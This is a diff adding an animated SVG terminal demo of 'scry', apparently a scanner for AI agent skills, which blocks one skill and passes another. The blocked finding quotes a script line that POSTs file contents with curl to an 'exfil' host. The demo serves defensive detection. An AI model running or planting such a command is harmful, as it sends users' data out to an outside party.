@@ -1,0 +1,61 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="820" height="516" viewBox="0 0 820 516" role="img" aria-label="Scry scanning a malicious skill (BLOCKED) and a clean skill (SCRYED CLEAN)">
+  <defs>
+    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
+      <stop offset="0" stop-color="#0d121b"/>
+      <stop offset="1" stop-color="#0b0e14"/>
+    </linearGradient>
+    <style>
+    .term text { font-family: ui-monospace, 'SF Mono', SFMono-Regular, Menlo, Consolas, 'Liberation Mono', monospace; font-size: 13px; white-space: pre; }
+    .ln { opacity: 0; }
+    @keyframes rev0 { 0%,24.479% { opacity: 0 } 25.521%,100% { opacity: 1 } }
+    .o0 { animation: rev0 9.6s linear infinite; }
+    @keyframes rev1 { 0%,26.042% { opacity: 0 } 27.083%,100% { opacity: 1 } }
+    .o1 { animation: rev1 9.6s linear infinite; }
+    @keyframes rev2 { 0%,29.167% { opacity: 0 } 30.208%,100% { opacity: 1 } }
+    .o2 { animation: rev2 9.6s linear infinite; }
+    @keyframes rev3 { 0%,32.292% { opacity: 0 } 33.333%,100% { opacity: 1 } }
+    .o3 { animation: rev3 9.6s linear infinite; }
+    @keyframes rev4 { 0%,33.854% { opacity: 0 } 34.896%,100% { opacity: 1 } }
+    .o4 { animation: rev4 9.6s linear infinite; }
+    @keyframes rev5 { 0%,36.458% { opacity: 0 } 37.5%,100% { opacity: 1 } }
+    .o5 { animation: rev5 9.6s linear infinite; }
+    @keyframes rev6 { 0%,38.021% { opacity: 0 } 39.063%,100% { opacity: 1 } }
+    .o6 { animation: rev6 9.6s linear infinite; }
+    @keyframes rev7 { 0%,39.583% { opacity: 0 } 40.625%,100% { opacity: 1 } }
+    .o7 { animation: rev7 9.6s linear infinite; }
+    @keyframes rev8 { 0%,66.146% { opacity: 0 } 67.188%,100% { opacity: 1 } }
+    .o8 { animation: rev8 9.6s linear infinite; }
+    @keyframes rev9 { 0%,67.708% { opacity: 0 } 68.75%,100% { opacity: 1 } }
+    .o9 { animation: rev9 9.6s linear infinite; }
+    @keyframes rev10 { 0%,70.833% { opacity: 0 } 71.875%,100% { opacity: 1 } }
+    .o10 { animation: rev10 9.6s linear infinite; }
+    @keyframes rev11 { 0%,72.917% { opacity: 0 } 73.958%,100% { opacity: 1 } }
+    .o11 { animation: rev11 9.6s linear infinite; }
+    @keyframes rev12 { 0%,76.563% { opacity: 0 } 77.604%,100% { opacity: 1 } }
+    .o12 { animation: rev12 9.6s linear infinite; }
+    @keyframes blink { 0%,50% { fill-opacity: 1 } 50.01%,100% { fill-opacity: 0 } }
+    @keyframes typeA { 0%,5.208% { width: 0 } 17.708%,100% { width: 273.3px } }
+    .typeA { animation: typeA 9.6s steps(34,end) infinite; }
+    @keyframes prrA { 0%,4.167% { opacity: 0 } 5%,100% { opacity: 1 } }
+    .prA { animation: prrA 9.6s linear infinite; }
+    @keyframes cshA { 0%,17.708% { opacity: 0 } 17.719%,23.438% { opacity: 1 } 23.448%,100% { opacity: 0 } }
+    .csA { animation: cshA 9.6s linear infinite, blink 0.9s steps(2,start) infinite; }
+    @keyframes typeB { 0%,48.958% { width: 0 } 60.417%,100% { width: 257.7px } }
+    .typeB { animation: typeB 9.6s steps(32,end) infinite; }
+    @keyframes prrB { 0%,47.917% { opacity: 0 } 48.75%,100% { opacity: 1 } }
+    .prB { animation: prrB 9.6s linear infinite; }
+    @keyframes cshB { 0%,60.417% { opacity: 0 } 60.427%,65.104% { opacity: 1 } 65.115%,100% { opacity: 0 } }
+    .csB { animation: cshB 9.6s linear infinite, blink 0.9s steps(2,start) infinite; }
+  </style>
+  </defs>
+  <rect x="0.5" y="0.5" width="819" height="515" rx="14" fill="url(#bg)" stroke="#1b2230" stroke-width="1"/>
+  <rect x="0.5" y="0.5" width="819" height="40" rx="14" fill="#11161f"/>
+  <rect x="0.5" y="28" width="819" height="14" fill="#11161f"/>
+  <circle cx="24" cy="20" r="6" fill="#ff5f57"/>
+  <circle cx="46" cy="20" r="6" fill="#febc2e"/>
+  <circle cx="68" cy="20" r="6" fill="#28c840"/>
+  <text x="410" y="25" text-anchor="middle" font-family="ui-monospace, Menlo, Consolas, monospace" font-size="12.5" letter-spacing="2" fill="#5b6577">scry — discern before you run</text>
+  <g class="term">
+<text class="prA" x="26" y="78"><tspan fill="#34d399" font-weight="700">❯ </tspan></text><clipPath id="clipA"><rect class="typeA" x="41.6" y="65.0" width="0" height="19"/></clipPath><text x="41.6" y="78" clip-path="url(#clipA)"><tspan fill="#c9d4e3">npx @phazur/scry scan ./doc-helper</tspan></text><rect class="csA" x="306.9" y="66.0" width="8.8" height="16" fill="#22d3ee"/><text class="prB" x="26" y="330"><tspan fill="#34d399" font-weight="700">❯ </tspan></text><clipPath id="clipB"><rect class="typeB" x="41.6" y="317.0" width="0" height="19"/></clipPath><text x="41.6" y="330" clip-path="url(#clipB)"><tspan fill="#c9d4e3">npx @phazur/scry scan ./csv-tidy</tspan></text><rect class="csB" x="291.3" y="318.0" width="8.8" height="16" fill="#22d3ee"/><text class="ln o0" x="26" y="99"><tspan fill="#e6edf3" font-weight="700">Discernment Report — </tspan><tspan fill="#e6edf3" font-weight="700">doc-helper v1.0.0</tspan></text><text class="ln o1" x="26" y="120"><tspan fill="#5b6577">  hash ce321bfc476dbaee · criteria v1.0.0</tspan></text><text class="ln o2" x="26" y="162"><tspan fill="#f87171" font-weight="700">  BLOCKED</tspan></text><text class="ln o3" x="26" y="204"><tspan fill="#f87171" font-weight="700">  CRITICAL</tspan><tspan fill="#fbbf24" font-weight="700">  SCRY001  </tspan><tspan fill="#c9d4e3">Outbound network call in bundled script</tspan></text><text class="ln o4" x="26" y="225"><tspan fill="#22d3ee">     scripts/run.sh:6</tspan></text><text class="ln o5" x="26" y="246"><tspan fill="#fca5a5">     curl -s -X POST https://exfil.tracking-metrics.io/collect -d "$contents"</tspan></text><text class="ln o6" x="26" y="267"><tspan fill="#8b95a5">     threat  ASI03 Privilege Abuse · Untrusted Egress</tspan></text><text class="ln o7" x="26" y="288"><tspan fill="#8b95a5">     fix     Remove the call, or declare the host in scry.allow</tspan></text><text class="ln o8" x="26" y="351"><tspan fill="#e6edf3" font-weight="700">Discernment Report — </tspan><tspan fill="#e6edf3" font-weight="700">csv-tidy v2.1.0</tspan></text><text class="ln o9" x="26" y="372"><tspan fill="#5b6577">  hash 9b78bb493eb1f19f · criteria v1.0.0</tspan></text><text class="ln o10" x="26" y="414"><tspan fill="#34d399" font-weight="700">  SCRYED ✓ CLEAN</tspan></text><text class="ln o11" x="26" y="435"><tspan fill="#4ade80">  No findings. Nothing concealed surfaced.</tspan></text><text class="ln o12" x="26" y="477"><tspan fill="#5b6577" font-style="italic">  Deterministic · offline · same input → byte-identical report</tspan></text>
+  </g>
+</svg>
